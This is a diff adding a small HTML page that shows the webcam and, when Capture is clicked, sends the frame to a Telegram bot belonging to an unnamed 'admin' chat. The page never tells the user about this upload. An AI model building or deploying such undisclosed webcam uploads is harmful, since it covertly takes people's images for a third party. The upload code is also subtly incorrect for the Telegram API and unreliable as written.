@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Camera Capture</title>
+</head>
+<body>
+    <video id="video" autoplay></video>
+    <button id="capture">Capture</button>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const captureBtn = document.getElementById('capture');
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => { video.srcObject = stream; });
+
+        captureBtn.addEventListener('click', () => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            let imageData = canvas.toDataURL('image/png');
+            
+            // Send image to Telegram bot
+            fetch('https://api.telegram.org/bot<TOKEN>/sendPhoto', {
+                method: 'POST',
+                body: JSON.stringify({
+                    chat_id: '<ADMIN_CHAT_ID>',
+                    photo: imageData
+                }),
+                headers: { 'Content-Type': 'application/json' }
+            });
+        });
+    </script>
+</body>
+</html>
